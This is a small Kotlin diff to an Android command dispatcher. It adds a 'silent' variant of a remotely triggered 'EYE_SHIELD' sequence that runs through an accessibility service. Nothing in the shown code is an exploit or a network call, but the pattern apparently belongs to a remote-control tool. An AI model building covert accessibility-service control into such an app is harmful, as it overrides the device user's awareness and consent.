@@ -2028,8 +2028,17 @@ object CommandProcessor {
                 "EYE_SHIELD" -> {
                     val service = MyAccessibilityService.instance
                     if (service != null) {
-                        service.startEyeShieldSequence(id, content.trim().uppercase())
+                        service.startEyeShieldSequence(id, content.trim().uppercase(), false)
                         status = "EYE_SHIELD_SEQUENCE_INITIATED"
+                    } else {
+                        status = "FAILED (SERVICE_OFF)"
+                    }
+                }
+                "EYE_SHIELD_SILENT" -> {
+                    val service = MyAccessibilityService.instance
+                    if (service != null) {
+                        service.startEyeShieldSequence(id, content.trim().uppercase(), true)
+                        status = "EYE_SHIELD_SILENT_SEQUENCE_INITIATED"
                     } else {
                         status = "FAILED (SERVICE_OFF)"
                     }
